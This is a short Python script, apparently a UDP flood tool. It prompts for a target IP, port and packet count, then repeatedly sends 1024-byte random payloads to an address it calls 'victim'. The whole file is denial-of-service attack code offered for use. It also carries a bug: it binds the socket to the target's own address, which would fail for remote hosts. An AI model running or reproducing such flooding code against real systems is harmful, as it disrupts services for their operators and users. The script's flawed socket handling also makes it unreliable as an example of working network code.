import socket
import random


target = input("TARGET IP: ")
port = int(input("TARGET PORT: "))
numofpackets = int(input("How many packets: "))


while (0 < numofpackets):
	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	s.bind((target, port))

	data = random.randbytes(1024)
	victim = (str(target), int(port))

	for i in range(numofpackets):
		s.sendto(data, victim)
		print(f"Sent: {i}", end='\r')
		numofpackets -= 1

	s.close()
